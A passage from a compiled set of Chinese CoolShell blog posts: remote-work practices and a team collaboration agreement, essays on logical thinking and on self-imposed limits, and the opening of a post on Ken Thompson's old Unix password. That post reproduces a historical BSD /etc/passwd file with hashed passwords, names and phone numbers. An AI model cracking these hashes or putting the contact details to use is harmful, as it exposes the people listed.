- **自动化和简化**。自动化和简化是我平时追得最多的东西了，从软件的Unit Test, Functional Test, Performance Test 一直到用Kubernetes进行自动化部署，我要求的就是从一提交完代码后就自动化的上线。我们玩的是Amazon的“单分支”代码管理的玩法，一旦代码merge上master，就会直接上线（当然需要通过灰度）。因为远程团队如果没有自动化的工具，那么，就会导致整体效率的下降。

- **Owner文化**。这个太重要的了，但是，这并不是在说，如果一个事没有owner，就会像“三个和尚”那样，事情就进了没人管的地步。这是因为很多人在工作中都是比较 nice 的，比较 nice 的人通常来说都不好意思跳出来对别人发号施令。所以，Owner 文化就是要求每件事都要定义一个Owner，而这个Owner是有权对其它人发号施令的，其他人也有义务要配合他。当然，Owner 的权利越大，责任也会越大！

- **Review文化**。Review文档是一种把知识或是想法传递出去的方式。我们在实践过程中，需要大家把好的想法写下来，这需要包括问题背景、目标、可选的方案（这些方案需要有引用和数据，不能是拍脑袋）、还需要有Pros/Cons的比较。然后再发起讨论。这样，事情在一开始就做好，那么就可以让大家的讨论更加地有效率。**很多人以为开会讨论有个议题就行了，其实不够，有效率的开会讨论需要的是议案，而且还是高质量的议案！**

- **目标承诺**。我们需要每个人承诺自己的工作目标，这个完全由每个个体来发起、完成。一般来说，每个人自己给自己制定的计划最好是在1-2周内。

- **自我管理**。我们的实践是没有审批制度，无论是，休假、报销、出差，完全是自己自由安排，但需要告诉团队（除非在一些关键时期没法休长假，需要整个团队全力以赴），但千万不要撒谎和作弊，一旦发现，直接开除就好了。这个是基于好人更多的原则制定的（没有必要为了少数的坏人一刀切后让所有人痛苦）

- **闲聊和自行见面**。见面和不能见面是一件非常不一样的事，在一起工作时，人和人是会有感情的，因为会有闲聊。远程的时候，则只有工作了。所以，我们鼓励团队人员间的私聊，闲聊，互相对方讲讲自己的经历和过往，同时，也鼓励员工自行出差到对方的城市见见跟你一起工作的人，公司报销差旅费。

- **知识分享会**。我们每周都有知识分享会，一次只讲半个小时，不贪多，就讲一个小的知识点。然后，团队中的一些人还主动使用Google Form来收集分享的反馈信息。

- **就地奖励文化**。我们默认上是没有年终奖，只有就地奖励文化。也就是说，你做的事挣钱了，利润中有70%公司拿走，剩下的30%团队的人就地分掉。这样会让团队里的每个人都会想怎么挣钱，除了可以把精力放到那些能够让用户付费的地方上，更重要的是让团队成员了解一下业务和用户为什么要付费，这个是非常关键的。当然，如果公司没有挣钱，但是员工工作的不错，我们还是会给年终奖的。不挣钱的主要责任是我的，而挣钱的主要功劳是团队的。

- **外包支持性的工作**。一些支持性的工作尽可能地使用外包，比如：HR、行政、发工资财务、员工持股、测试人员、定制化开发……这样可以让你的团队更小，更高内聚。更利于远程。

- **异步编程**。如果一个项目是从零开始的，对于一个团队来说可能会是无从下手的，这需要有个人（owner）把代码的框架和结构给组织好。然后其他的人进入把坑填了，这样的效率会高很多。另外，不见面的结对编程，完全可以使用异步的方式进行，这其实就是多人干同一个pull request的方式。有Github这样的协议工作，远程编码变得很方便。

关于我们的远程工具，我们主要是使用：

- 开发环境
  - **AWS**，我们主要使用AWS，因为我希望团队在使用AWS的时候能够被潜移默化。
- 协作工具
  - **Github**。我们所有跟软件开发的工作都会在Github上，我们重度使用 Github 的 pull request 和 issue，也会使用 Github Project 里的看板和 Wiki。
  - **Google全家桶**。我们重度使用 Google，Google Group、Google Driver、Google Docs 主要是一些各式各样的文档。
- 通讯工具
  - **语音沟通**。主要是使用Zoom，因为Zoom不但可以支持几十人在线，还可以云录制。如果小范围交流的话，一般使用微信语音。
  - **工作沟通**。主要是使用Slack，Slack作为一个信息集散地，可以分频道，可以分thread讨论，微信注是个渣。
  - **吹水群**。我司的吹水群主要是Telegram，因为比微信好太多了……

你会发现，我们的工具有好些都是在墙外的，是的，因为墙内的同类的工作实在是太难用了，没办法不用。而且，**我倾向于让大家用上最先进的工具，这样我们团队中的每个人的品味才会被这些好的工具潜移默化**。

#### 远程工作协议

下面是我们的远程工作协议（无删减），这是每一个远程工作人员需要同意并做到的协议（其中有 Amazon Leadership Principles 的影子），目前在 v1.3 版，未来还会更新，我现在把它晒出来，也希望得到更好的建议！

 

# MegaEase 远程工作团队协作协议 v1.3

## Principles

### 0）Ownership & Leadership

每个人都是Owner，都是Leader， 如果看到团队或是项目有问题的时候，不要等，也不忍，请马上说出来，并给出相应的方案， **自己跳出来召集开会，及时调整。不要闷在那里，自己憋！**

### 1）Initiative

每人个都必需是主动的，都需要自己发起要做的事，或是自己要认领要做的事，如果发现自己没有事情了， **需要学会主动发现问题，主动找到可以improve的地方，创新来源于此**。没有路要学会自己造路！

### 2）Objectives Oriented

每个人都是产品经理，也都是项目经理，每个人都必需把自己的工作和我们大的目标连接在一起，知道什么是重点，重点的东西就是两件事：一）从用户的角度出发，二）从产品的角度出发。 **这意味着我们要随时观察整个产品的样子，而不只是自己这一块东西** 。

### 3）Insists on High Standard

举法其上，得乎其中，举法其中，得乎其下，举法其下，法不得也。我们要坚持用高的标准要求自己，对于高标准的目标不妥协，但是在实施路径和策略上可以妥协。

## Practices

### 0）Online

工作的时候必需在线。如果不在线了，需要说一下不在线的时长, 目前我们工作的事宜在通讯工具采用Slack， 如果需要请假的情况，如果不是紧急情况，需要**提前一天** 在MegaEase的Slack *#random* 频道中提前说明。如果是紧急情况，也需要提前在*random*频道中告知大家。

### 1) Documentation Driven

面对面交谈、电话语音、微信、Slack虽然是比较实时的反馈工具，但是只有文档是可以把重要信息给结构化的，而且写文档其实是比起前面的方式来说是更为深度的思考，因为会让你自己审视自己的想法。所以，对于一些重要 “**功能**”、“**流程**”、“**业务逻辑**” 、“**设计**”、“**问题**”，以及“**想法**”，最好都以文档化的方式进行。请使用Github的 wiki、project、issue这些工具或是使用Google Doc.

### 2）Design Review

对于一些重要的问题或是工作（每个人都能够判断什么是关键问题和工作）， **需要先把自己的想法share出来，而不是先实现** 。

一个好的 Design 文档需要包括如下项：

- **Background**。交待这个事的背景、需求和要解决问题。

- **Objectives**。说明这个事的目标和意义。

- Alternative Solutions

  。 给出多个解决方案，并能够进行 Pros/Cons 对比。

  - **Reference**。方案需要有权威引用支持。
  - **Data**。方案需要有相关数据数据支持。

- **Conclusion**。结论是什么。

### 3) Simplification & Automation

简化和自动化是软件工程所追求的两大目标，简化不是简陋，简化是对事物一种抽象和归纳能力，其能够提升软件的复用能力和扩展性，自动化是工程能力的重要体现，一方面，远程工作中自动化的能力可以让整个团队更高效地协作，另一方面，自动化是规模化的提条件。所以，我们要无时无刻地思考如何简化和自动化现有的事情。

### 4）Review & Re-factory

无论是代码还是工作都是需要反思和重构的。反思是进步的源泉，项目告一段落时，出现问题时，都应该召集团队做集体反思，把好的东西坚持下去，把不好的东西优化掉。这样才能进步和改进。但是任何的优化措施是可执行的。

### 5）Milestone Commitment

对于一个项目，每个人都需要有自己的 milestone 计划， **这个计划最好是在2周以内，1周内是最好的。而且要承诺到** 。

### 6）Evidence Driven

任何讨论和分析都要基于权威的证据、数据或是引用。在我们做设计的时候，或是有争论的时候，说服对方最好的方式就是拿出证据、数据或是权威引用。比如：我的XX设计参考了TCP协议中的XX设计，我的XX观点是基于XX开源软件的实现……如果争论不休就停止争论，然后各自收集和调查自己观点的佐证。

### 7）Demo Day

把自己做的东西跟团队做一次实时的演示。这样有助于开发人员从产品角度思考自己的工作。除了演示产品功能，还可以演示算法，设计，甚至代码。

### 8) Effective Meeting

会议主要处理三件事：提出议案、发现问题、共识结论。

- 会议不仅仅要有议题，最好还有议案。
- 会议期间不解决问题，只发现问题，和跟踪问题。
- 会议必需要有共识和结论，如果不能达到共识和结论，那就当成问题处理，由问题的负责人跟进问题。

关于周会或是临时性的团队会议（私下讨论不属于会议），会议组织者需要在事前收集会议议题，其中包括如下分类：

- **项目类**：需要事先有项目进度计划表（任何分项最好控制在1-2人周内）
- **方案类**：需要事先写好相关的方案和设计才能讨论（参看 Design Review 章节）
- **问题类**：需要事先写好相关的问题和解决提案（参看 Design Review 章节）
- **决策类**：需要事先写好整事的前因后果以及利弊分析
- **信息类**：需要事先写好相关的事宜说明

组织者需要在周五的时候发出会议议题收集，其中包括：

- 自己知道的项目的进度跟进（需要相相关的项目负责人准备相关的项目计划）
- 方案和问题类的需要各个项目负责人提出来，并有相关的设计文档可供Review
- 信息类和决策类的事宜可以写在Google Doc上，也可以写在 Team 的 Issue 里

其它负责人可以在会议上加入自己团队的东西，或是要求其他团队提供更多的信息。

### 9）1-2-3 Escalation

遇到问题的时候，自己一个人处理1小时内没有思路，请找他人小范围讨论，如果与他人2小时内没有结果，请上升到团队范围，如果在团队范围3小时内没有思路，我们就需要借助外部力量了。

### A）3PS Update

每个人更新进度的时候，不要只是一个check-in，而是需要更 meaningful 的说一下工作内容，在工作告一段落的时候，希望简单的说一下工作总结。这里的practice是： **3PS – Plan，Proirity，Problem，Summary， – 你的计划是什么？优先级是什么？遇到了什么问题？当前的工作摘要** 。

### B) Disagree and Commitment

在我们开发的时候，团队的成员都会有自己风格，必然会对同一个问题产生较大的争议（Disagree），我们鼓励有争议，但是是在团队的决议作出之前。一旦团队形成决议，团队的成员就必须支持这个决议，并在这个方向上做出贡献。

但是关于决议的形成过程肯定充斥着各种的争论，对于这些争论，我们可以按照下面的Guidline 来处理争议：

- Owner要负责对重大的讨论推进，尽快形成结论。
- 在决议过程中，要有纪要，要更新到 Github 相关项目的 Issue 或 Pull Request 里，并且要让整个团队知道，信息平等很重要。
- 不要妥协，坚持高的标准。第一标准是工业标准，第二标准是国外的大公司标准（如：google, fb, github, aws…），第三标准才是国内的标准。
- 那怕再复杂，只要是标准，就可以说服用户。用户再无理，也不可能反对工业级的标准。
- Release出去的东西，只要被用户用上了，要改就难了，所以要谨慎而果敢。

#### 小结

远程工作并不是目的，但是远程工作会逼迫管理者面对管理的本质问题。远程工作趋向于找到优秀自驱的人才，守护团队的共同目标，并打造精悍高能的团队，并要求我们在需要沟通和协作的地方使用更为科学和有效的手段，在各个环节中提升工作效率，降低组织内耗……你的团队管理模型是否最优，在远程工作下就会一览无余！远程工作只是一个手段，提升管理水平才是真正的目的！

（全文完）

# 使用简单的逻辑方法进行独立思考

#####  [2019年12月26日 ](https://coolshell.cn/articles/20533.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [67 条评论](https://coolshell.cn/articles/20533.html#comments) 91,561 人阅读

![img](photo/logical-smart-intelligence-200x200.png)这是一个非常复杂的世界，这个世界上有很多各式各样的观点和思维方式，作为一个程序员的我，也会有程序员的思维方式，程序员的思维方式更接近数学的思维方式，数学的思维方式让可以很容易地理清楚这个混乱的世界，其实，并不需要太复杂的数学逻辑，只需要使用一些简单的数学方法，就可以大幅提升自己的认识能力，所以，在这里，记录一篇我自己的思维方式，一方面给大家做个参考，另一方面也供更高阶的人给我进行指正。算是“开源我的思维方式”，开放不仅仅是为了输出，更是为了看看有没有更好的方式。

我的思维方式中，使用数学逻辑的方式进行思考，通常来说，我会使用五步思考的方式：

**第一步：信息数据可考证**。如果一个观点或是一个见解的数据是错误的，那么就会造成后面的观点全是错的，所以，首要的是要进行数据的查证或考证。一般来说，如果一篇文章的作者足够严谨的话，他的需要给他的数据建立相关的引用或是可以考证的方法方式。如果一篇文章中出现的是，“有关专家表明”、“美国科学家证明”、“经济学家指出”，但是没有任出处，也没有点明这个专家或是科学家的名字，或是，也没有说明或引用让读者可以自己去验证的方法。那么，其引用的话或是数据是无法考证的，如果是无法考证的，那么，这篇文章的水份就非常大了。一般来说，当我读到一篇文章中的东西没有可考证的来源或是方法时，通常来说，我就不会再读了，因为这篇文章的价值已经不大了，如果我关心这篇文章中的东西，我会改为自己去查找的方式，虽然变“重”了，但是很安全。（所以，像Wikipedia这样的网站是我经常去获得信息的地方，因为信息可以被考证是其基本价值观）



**第二步：处理集合和其包含关系**。这是一个非常简单的人人都会的数学逻辑。比如：哲学家是人，柏拉图是哲学家，所以，柏拉图是人。就是一个在包含关系下的推理。你不要小看这个简单的逻辑，其实很多人并不会很好的应用，相反，当感情支配了他们以后，他们会以点代面，以特例代替普遍性。比如，地图炮就是一种，他们看到了多个案例，他们就开始把这个案例上升上更大的范围，比如：河南人新疆人都是小偷，上海人都是小市民。日本人都是变态和反人类……等等。除了这些地图炮外，还有否定整个人的，比如一个人犯了个错或是性格上有缺陷，就会把整个人全盘否定掉，员工抢个月饼就上升到其价值观有问题……。在数学的逻辑包含中，超集的定义可以适用于子集，通过子集的特征可以对超集进行探索，但是没法定义超集。另外，集合的大小也是一个很重要的事，[幸存者偏差](https://zh.wikipedia.org/wiki/倖存者偏差)会是一个很容易让人掉下去的陷阱，因为可能会有很大的样本集可能在你的视线盲区。

**第三步：处理逻辑因果关系**。所谓因果关系，其实就是分辨充分条件、必要条件和充分必要条件，然后处理其中的逻辑是否有关联性，而且有非常强的因果关系。没有能力分辨充分必要条件处理因果关系是很多人的硬伤。就像我在《[努力就会成功](https://coolshell.cn/articles/19271.html)》中说的一样，“努力” 和 “成功”是否有因果关系？各种逻辑混淆、概念偷换、模糊因果、似是而非全是在这里。比如：掩耳盗铃、刻舟求剑就是因果关系混乱的表现。人们会经常地混淆两个看来一起发生，但是并没有关联在一起的事。因果关系是最容易被模糊和偷换的，比如：很多人都容易混淆“加班”就会有“产出”，混淆了“行动”就会有“结果”，混淆了“抵制”就会赢得“尊重”，混淆了“批评”等于“反对”……等等。除了这些以外，微信公众号里的很多时评文章，他们的文章中的结论和其论据是没有因果关系的，好多文章就是混淆、模糊、偷换……**因果关系出问题的文章读多了是对大脑有损伤的，要尽量远离**。

**第四步：找到靠谱的基准线**。就像我们写代码一样，我们都是会去找一些最佳实践或是业内标准，原因是因为，这样的东西都是经过长时间被这个世界上很多人Review过的，是值得依赖和靠谱的，他们会考虑到很多你没有考虑过的问题。所以，你也会看到很多时评都会找欧美发达国家的作参考的做法，因为毕竟人家的文化是相对比较文明、科学、开放和先进的。找到世界或是国际的通行标准，会更容易让人进步。比如：以开放包容加强沟通的心态，就会比封闭抵制敌对的心态要好得多得多，智者建桥，愚者建墙。当然，我们也开始发现，有一些事上，有利于自己的就对标，不利于自己的就不对标，而且，除了好的事，不好的事也在找欧美作对标，于是开始“多基准线”和“乱基准线”，这种方式需要我们小心分辨。

**第五步：更为深入和高维的思考**。如果一件事情只在表面上进行思考其实只是一种浅度思考，在Amazon，线上系统出现故障的时候，需要写一个Correction of Errors的报告，其中需要Ask 5 Whys（参看 Wikipedia 的 [Five Whys 词条](https://en.wikipedia.org/wiki/Five_whys)），这种思考方式可以让你不断追问到深层次的本质问题，会让你自己做大量的调查和研究，让你不会成为一个只会在表面上进行思考的简单动物。比如：当你看到有出乎你意料的事件发生时（比如负面的暴力事件），你需要问一下，为什么会发生，原因是什么？然后罗列尽可能全的原因，再不断地追问并拷证下去（这跟写程序一样，需要从正向案例和负向案例进行考虑分析，才可能写出健壮性很强的代码），我们才会得出一个比较健壮的答案或结构。

需要注意的是，在上述的这五种思维方式下，你的思考是不可能快得起来的，这是一个“慢思考”（注：如果读过《[思考，快与慢](https://book.douban.com/subject/10785583//)》这本书的人就知道我在说什么），独立思考是需要使用大脑中的“慢系统”，慢系统是反人性的，所以，能真正做到独立思考的人很少。更多的人的“独立思考”其实只不过是毫无章法的乱思考罢了。

通过上述的这五点，我相信你是很容易识别或是分辨出哪些信息是靠谱的，哪些信息是很扯的，甚至会改善你自己的言论和思考。但是，**请注意，这些方法并不能让你获得真理或是真相**。但是这也够了，一个人如果拥有了能够分辨是非的能力，也是很不错的了。虽然不知道事实是什么，但是你也不会盲从和偏信，从而不会被人煽动，而成为幕后黑手的的一只“肉鸡”。

多说两句，下面是一些我个人的一些实践：

- 当新闻报道报道的不是客观事实，而是加入了很多观点，那么这篇新闻报道是不可信的。
- 对于评论性的文章，没有充足权威可信的论据时，不能完全相信。
- 不是当事人，不是见证人，还要装作自己是知情的……不知道这种人的自信怎么来的？
- 信息不公开的，并有意屏蔽信息的，不能作为可信的信息源。
- 当出现大是或是大非的事时，一定要非常小心，这个世界不存在完全的美和完全的丑，这样的观点通常来说都是危险的，此时要多看看不同角度的报道和评论，要多收集一些信息，还要多问问为什么。

欢迎你告诉我一些你的实践和思维方式。

（全文完）

# 别让自己“墙”了自己

#####  [2019年12月01日 ](https://coolshell.cn/articles/20276.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [300 条评论](https://coolshell.cn/articles/20276.html#comments) 269,947 人阅读

![img](photo/open-your-creative-mind-300x198.jpg)这一两周与几个朋友聊天，有年轻的90后，也有大叔级的70后，这些人在我看来都是很有能力的人，但是一些喜好过于强烈，让我不经意地回顾了我工作20年来身边的人，有发展得好的，也有发展的不好的，有些人是很可惜的，因为限制他们的不是其它人，也不是环境，而是自己，所以，很想写下这篇文章。（注：这篇文章可能会是一篇说教的文章，所以，可能会让你看着犯困，所以，我会尽量地短一些，而且尽可能多讲故事，少道理，这里的故事，全是真实发生的）

#### 几个故事

2019年年初，我面试了一个很年轻的小伙子（93/94年出生），这个小伙子特别有灵性，也很聪明，计算机专业出身，也很喜欢技术，基础和学习能力也很好。在我这20年来认识的人中，如果他能呆在北京、上海、深圳这样的城市，我保证不出三年，他会成为他们同龄人中非常出色的技术人员，如果有个好的舞台有一个好的团队带他，他的未来会非常成功。然而，这个小伙子有两大喜好：1）只愿（或是说被迫）呆在一个毫无IT的环境的三/四线城市，2）对技术有非常大的偏好，只喜欢Go语言，非常不喜欢其它的语言，比如：Java（离开Java的世界，基本上离开了做架构的世界（**相关解释见文末**））。

他的这两个喜好，足以让一个未来会很优秀的人毁掉，因为，这个时代没有限制他，他的能力也没有限制他，但是他的意识完完全全地限制了他。

- 他把自己最宝贵的青春放在了很烂的项目上，就算能用一些新的技术，他也只能算是自娱自乐，在实验室中玩玩具罢了。
- 他把自己的技术栈封闭起来，而直接放弃了这个时代最具工业化的技术Java，对于一个好的程序员来说，同时掌握几门语言和技术完全是没什么问题，但是自己封闭了自己的视野。

实在是非常可惜，我本来是可以为他介绍到一些很不错的公司的，但是他这样的习性，等于自己把自己未来的门给关上了，虽然我跟他长谈过，但是我也没有办法叫醒不想醒的人……

- 视野、环境和舞台，对一个人的限制是非常大的。井蛙不知道大海，被空间维度所限制；夏虫不知道冬天，是被时间维度所限制；圈养的动物没有斗志，是被自己意识所限制。
- 偏见和不开放，对一个人的限制是真正有毁灭性的。主动让自己成为一个瞎子和聋子，主动把自己的能力阉割掉，这是一件令人痛心的事。想想大清的闭关锁国是如何让亚洲第一的北洋水师给毁掉的……

我还有个同学，他的技术并不差，就算呆在昆明这种很落后的地方，他也非常地好学，学习英文，学习各种新技术，对技术没有任何的偏好，喜欢C/C++/Java/Python/Shell，同样喜欢前端Javascript，对基础知识非常地踏实，他在技术上没有限制自己的潜力，有什么就学什么。后来，我带他玩Docker/Go/K8S……分布式架构，他也上手的很快……像他这样的人，技术能力完全没得说，比我还大一岁，44岁了，还是一样的天天追代码细节，看Youtube的各种大会，翻github里的各种issue和pull request……

我同学这人，拥有了成为一个技术牛人几乎所有的条件：基础知识过硬，细节扎得深，面很广，学习能力强，有英文能力，逻辑思维能力不错，非常的自律，执行力也很强，抓得住重点……然而，只有一个小问题，就是没有到大公司历练过，我三番五次叫他从昆明出来，但是最终他都呆在昆明这个城市没有出来，因为有所谓的家庭约束。然而，我身边还有好些人，把自己家从北京搬到上海，从上海搬到深圳，从厦门搬到深圳……这样的人大有人在……像他这样的能力，在哪个公司都会是主力和骨干，对于一个公司的主力和骨干来说，家庭上的这些问题都是小问题都是有很多解的……

另外，我这个同学还是一个比较悲观的人，任何事情都是先想到不好的事，他关注负面的东西会胜于正面的东西，而且他还有一定的社交恐惧，怕与人相处和交流，时间越长越害怕，甚至有时候直接跟我说，“我就是不想改变”这样的话……其实，我以前也是一个很害怕与人交流的人，面试的时候，我根本不敢正眼看面试官一眼，也不知道与人怎么交流。但是，我与他不一样，我努力克服，不断地面试，与人面对面的交流，到一线技术客服接用户的电话，在公司里做分享，慢慢地到外面分享……3-5年就完全克服掉了。

其实，很多事情，完全是有解的，也没有必要担心，自己的心理障碍也是可以克服的，重点就是自己愿不愿意，只要愿意完成了一半，接下来就是不断的摸爬滚打坚持了。

- 不限制自己的人，会穷举各种方法来解决问题，限制自己的人，只会找各式各样的问题或借口。
- 不限制自己的人，会努力改变自己的问题和缺陷，限制自己的人，会放任自己。

#### 另外几个故事

我还有另外几个故事（活到四十多，能看到好多人十几年的发展过程，感觉有点上帝视角了）

我还有一个以前团队里的一个小伙，人是很聪明，但就完全就是野路子，他对技术没有什么偏好，一个PHP程序员，做那个Discuz!论坛，公司被并购了，转成Java，开始研究Java的各种细节，对技术从来没有什么偏见，有什么就玩什么，每做一个项目，就算是一样的他都要用新的技术做一遍，然后跟着我做云计算，我教他TCP，教他C/C++，后来一起玩Docker/Go，等等，反正是一点就通，他是我见过学习能力最强的人。但是，有一个事他一直与我的想法不一样，就是我希望他先把软件设计好，再写代码，他非常不能理解，他习惯于直接动手开干，然后有什么问题就整什么问题，我也很难教育他。

有一天，他电话面了一下Facebook，电话面了15分钟后对方就放弃了，他受到了严重的打击。然后，他就开始找菲利宾人练英文口语了，我也让他做算法题，然后，他才发现，一道连算法都不是的纯编程题都提交几次都过不了，等他做完了Leetcode最初的那151道题后，整个人都改变了，写代码前认认真真地在纸上把程序的状态，处理时序以及可能遇到的一些条件先罗列出来，然后，进行逻辑设计后，再写，从此，他就开启他更大的天地了。我后来把他推荐给了微软，先在中国的Bing，在中国升好2-3级，然后去了美国的Azure，现在听说他准备要跟 k8s 的 co-founder [Brendan Burns](https://github.com/brendandburns) 混了（虽然，他现在还在印度人手下，但是，我真的不知道他未来能玩多大，因为今年他才33岁，而且非常聪明）

他以前是把自己封闭起来的，我叫他出来，他也不出来，后来因为一些办公室政治的原因不得不来找我，于是我就带着他玩了两年，跟他讲了很多外面的世界是怎么玩的，他这个人也是一个相当不善于社交的人，但是心是开放的，愿意接受新的东西，虽然对技术也有一定偏见，比如不喜欢Windows，但是也不会不喜欢到完全封闭。后来我跟他说，微软的技术相当的强的，你看到的技术只是表面，深层次的东西都是相通的，直到他到了微软后发现各种牛逼的东西，对微软系统的技术的态度也有了改变，而且我让他跟我说很多微软那边的事，我发现，他对技术了解的维度已经是越来越高级的了……

还是我以前团队的一个小伙，他是一个前端，他说前端的东西没什么意思，想来找我做后端，我也一点点带他……后来，我说，你如果想要玩得好，你必需来北京，无论现在你觉得过得有多好，你都要放弃掉，然后，尽最大可能出去经历一下世界最顶尖的公司，我甚至跟他说，如果他女朋友不跟来的话，就先分开一段时间，先自己立业，他来北京的时候，他之前的同事都等着看他的笑话，我说，那些人连想都不敢想，不必管他们。于是，他去了Amazon，再过了一年去了西雅图，我跟他说，接下来就是去AWS，然后，如果有足够的野心，用自己的年轻这个资本去硅谷创业公司赌一把……未来他怎么样我不知道，但至少他没有限制自己，他的未来不会有封顶……

也是我的同学，我跟他在大学是上下铺，后来他去了人民大学读计算机博士，大学的时候做国产数据库kingbase，然后去了一家外企，天天被派到用户那边做数据分析，后来，他想回科研单位做国产数据库，我说，别啊，你的技术比我好太多，还有博士理论加持，你不去国外顶尖公司玩玩，你不知道自己有多强的，于是他跟公司申请去了国外做核心，后来因为Hadoop的原因，公司的产品最终成为了历史，于是我说，你来了美国么，你一定要去AWS，于是他就去了AWS的Aurora团队，成为了AWS明星级产品的中坚力量，天天在改MySQL的核心源码，干了两年，正在晋升 Principal Software Engineer ……

这里我到不是说出国有多牛，也许你只关注能挣多少钱，但是我想说，他们之所以能有这样的际遇，除了他们本来就有实力，还更因为他们从来不给自己设制什么限制，就是那种“艺多不压身”，有什么就学什么，有更高的就去向更高的迈进，其它的像家庭什么的问题其实都是会有解的，真的不必担心太多……

####  别限制了自己

上面的这些故事，也许你能看得懂，也许你看得不一定能懂，这里，让我来做个总结吧

- **做有价值的事**。这个世界对计算机人才的要求是供不应求的，所以，不要让自己为自己找各式各样的借口，让自己活在“玩玩具”、“搬砖”和“使蛮力加班”的境地。其实，我发现这世界上有能力的人并不少，但是有品味的人的确很少。**所谓的有价值，就是，别人愿付高价的，高技术门槛的，有创造力的，有颠覆性的**……
- **扩大自己的眼界，开放自己的内心**。人要变得开放，千万不要做一个狭隘的民族主义者，做一个开放的人，把目光放在全人类这个维度，不断地把自己融入到世界上，而不是把自己封闭起来，这里，**你的英文语言能力对你能不能融入世界是起决定性的作用**。开放自己的心态，正视自己的缺点，你才可能往前迈进。**你的视野决定了你的知不知道要去哪，你的开放决定了你想不想去**。
- **站在更高的维度**。面的维度会超过点的维点，空间的维度会超过面的维度，在更高维度上思考和学习，你会获得更多。**整天在焦虑那些低维度的事（比如自己的薪水、工作的地点、稳不稳定、有没有户口……），只会让你变得越来越平庸，只要你站在更高的维度（比如： 眼界有没有扩大、可能性是不是更多、竞争力是不是更强、能不能解决更大更难的问题、能创造多大的价值……），时间会让你明白那些低维度的东西全都不是事儿**。技术学习上也一样，站在学习编程语法特性的维度和站在学习编程范式、设计模式的维度是两种完全不一样的学习方式。
- **精于计算得失**。很多人其实不是很懂计算。绝大多数人都是在算计自己会失去多少，而不会算会得到多少。而一般的人也总是在算短期内会失去什么，优秀则总是会算我投入后未来会有什么样的回报，前者在算计今天，目光短浅，而后者则是舍在今天，得在明天，计算的是未来。***\*精于计算得失的，就懂得什么是投资，不懂的只会投机。对于赚钱，你可以投机，但是对于自己最好还是投资。\****
- **勇于跳出传统的束缚**。有时候，跳出传统并不是一件很容易的事，因为大多数人都会对未知有恐惧的心理。比如：我看到很多人才都被大公司垄断了，其实，有能力的人都不需要加入大公司，有能力的人是少数，这些少数的人应该是所有的公司share着用的，这样一来，对于所有的人都是利益最大化的。这样的事现在也有，比如：律师、设计师……。但是，绝大多数有能力的技术人员是不敢走出这步。我在2015年到2016年实践过一年半，有过这些实践，做“鸡”的比“二奶”好多了，收入也好很多很多（不好意思开车了）……

庄子说过几句话——

> 井蛙不可以语于海者，拘于虚也；//空间局限
>
> 夏虫不可以语于冰者，笃于时也；//时间局限
>
> 曲士不可以语于道者，束于教也。//认识局限

别自己墙了自己，人最可悲的就是自己限制自己，想都不敢想，共勉！

————————————————————

**注：这篇文章就是要劝大家更为开放，让自己有更多的可能性，能到更高的层次，做更有价值的事，成为更强更好的人……当然，如果你觉得你只想做一个平凡人，也和本文并不冲突……另外你也不要觉得这篇文章是让你要成为一个精英，但你一定要去摸高……这篇文章是告诉你一种面对人生的思考方式，在这种思考方式下，你会有更多的可能性，更大的场景……而不是直接把自己归到“平常人”，把自己“墙”了！**

注：我以为用Java适合做架构这事应该是常识了，但是评论中有很多人非常反对这个事。那我解释一下吧：首先，小型的项目用什么语言都行，爱用什么用什么。但是，真正的企业级架构就不一样了，其中并不仅仅只是RESTful API或RPC，还有各种配套设施和控制系统，比如：应用网关，服务发现、配置中心、健康检查、服务监控、服务治理（熔断、限流、幂等、重试、隔离、事务补偿）、Tracing监控、SOA/ESB、CQRS、EDA……这些东西在非Java的技术栈体系内，很难看到全貌，**Java强大的生态环境，就是让你把注意力放到更高层次的架构和业务上来的**。（千万不要觉得，整几个服务RPC一下，加个缓存，加个队列，就能叫架构，那只是系统集成罢了）

（全文完）

# UNIX 50 年：KEN THOMPSON 的密码

#####  [2019年11月03日 ](https://coolshell.cn/articles/19996.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [30 条评论](https://coolshell.cn/articles/19996.html#comments) 58,544 人阅读

![img](photo/ken.dennis-300x186.jpeg)50年前，除了Apollo上天之外，还有一个大事的发生，就是Unix操作系统的诞生，若干年前我写过《Unix的传奇，[上篇](https://coolshell.cn/articles/2322.html)，[下篇](https://coolshell.cn/articles/2324.html)》，Unix是我入行前十年伴我成长的操作系统，虽然现在Linux早已接过了Unix的时代交接棒，但是，Unix文化对我个人的技术观影响是非常大的（注：《[Unix编程艺术](https://book.douban.com/subject/1467587/)》是一本对影响我很深的书），而对于 [Ken Thompson](https://en.wikipedia.org/wiki/Ken_Thompson) 和 [Dennis Ritchie](https://en.wikipedia.org/wiki/Dennis_Ritchie) 这两位 Unix 的缔造者，也是计算机圈中的神一般的人物。今天，Dennis已经去逝，Ken在Google里跟 Rob Pike和 Robert Griesemer 这两位大神在开发Go语言。

P.S. 今年，我一直想写篇Unix 50周年纪念的文章，但一直无从下手，因为不想写过大的命题，如果能写个轶事最好不过。正好过完国庆节，技术圈里有个“热搜”——Ken Thompson的密码。但一直没有时间，所以拖到今天才写下来。

正文开始，2014年，有个叫Leah Neukirchen的程序员（[blog](https://leahneukirchen.org/blog/)）在 BSD 3 的源代码中的 `/etc/passwd` 看到了早年Unix黑客们的被 hash了的密码，该文件如下所示：



```
root:OVCPatZ8RFmFY:0:10:Ernie Co-vax,4156427925:/:
daemon:*:1:1:The devil himself:/:
bill:.2xvLVqGHJm8M:8:10:& Joy,4156424948:/usr/bill:/bin/csh
ozalp:m5syt3.lB5LAE:40:10:& Babaoglu,4156423806:/usr/ozalp:/bin/csh
sklower:8PYh/dUBQT9Ss:2:10:Keith &,4156424972:/usr/staff/sklower:/bin/csh
kridle:4BkcEieEtjWXI:3:10:Bob &,4156426744:/usr/staff/kridle:/bin/csh
kurt:olqH1vDqH38aw:4:10:& Shoens,4156420572:/usr/staff/kurt:/bin/csh
schmidt:FH83PFo4z55cU:7:10:Eric &,4156424951:/usr/staff/schmidt:/bin/csh
hpk:9ycwM8mmmcp4Q:9:10:Howard Katseff,2019495337:/usr/staff/hpk:/bin/csh
tbl:cBWEbG59spEmM:10:10:Tom London,2019492006:/usr/staff/tbl:
jfr:X.ZNnZrciWauE:11:10:John Reiser:/usr/staff/jfr:
mark:Pb1AmSpsVPG0Y:12:10:& Horton,4156428311:/usr/staff/mark:/bin/csh
